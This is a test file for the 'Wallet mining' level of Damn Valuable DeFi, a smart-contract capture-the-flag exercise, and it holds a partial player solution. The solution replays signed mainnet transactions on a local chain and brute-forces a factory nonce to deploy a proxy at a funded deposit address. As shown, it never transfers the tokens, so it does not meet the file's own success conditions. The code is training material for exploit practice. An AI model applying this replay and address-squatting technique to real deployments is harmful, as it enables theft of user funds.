const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        someTx = await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const mainnet = new ethers.providers.JsonRpcProvider(process.env.INFURA_URL);
        async function replay(txHash) {
            const tx = await mainnet.getTransaction(txHash);
            const unsignedTx = {
                to: tx.to,
                nonce: tx.nonce,
                gasLimit: tx.gasLimit,
                gasPrice: tx.gasPrice,
                data: tx.data,
                value: tx.value,
                chainId: tx.chainId
            };
            const signature = {
                v: tx.v,
                r: tx.r,
                s: tx.s
            }
            await ethers.provider.send("hardhat_setBalance", [tx.from, "0x56BC75E2D63100000"]);

            const serialized = ethers.utils.serializeTransaction(unsignedTx, signature);
            await ethers.provider.sendTransaction(serialized)
        }

        const txs = [
            "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3",
            "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4",
            "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261"
        ]

        for (const txh of txs) {
            await replay(txh);
        }

        console.log('replay done')

        // nonce found 43
        // let i = 0;
        // while (true) {
        //     const computedAddr = ethers.utils.getContractAddress({
        //         from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
        //         nonce: i,
        //     });
        //     if (computedAddr.toLowerCase() == DEPOSIT_ADDRESS) {
        //         break;
        //     }
        //     i++;
        //     console.log(i);
        // }

        const foundNonce = 43
        const computedAddr = ethers.utils.getContractAddress({
            from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
            nonce: foundNonce,
        });

        if (computedAddr.toLocaleLowerCase() !== DEPOSIT_ADDRESS) {
            throw new Error("invalid nonce!");
        }

        const factory = (
            await ethers.getContractFactory("GnosisSafeProxyFactory")
        ).attach("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");


        for (let i = 0; i < foundNonce; i++) {
            console.log('deploy wallet')
            await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
        }

        const tx = await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
        const receipt = await tx.wait()
        console.log(receipt)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
